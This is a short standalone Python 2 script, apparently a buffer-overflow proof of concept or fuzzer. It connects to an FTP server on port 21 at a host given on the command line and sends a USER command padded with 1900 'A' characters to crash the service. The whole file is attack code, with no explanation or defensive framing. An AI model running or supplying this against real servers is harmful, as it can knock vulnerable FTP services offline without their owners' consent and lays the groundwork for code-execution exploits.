#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 21))

print sock.recv(1500)

buffer = "A"*1900


sock.send("USER " + buffer + "\r\n")

print sock.recv(1500)

sock.send("PASS demo@demo.com\r\n")

print sock.recv(1500)

sock.close()


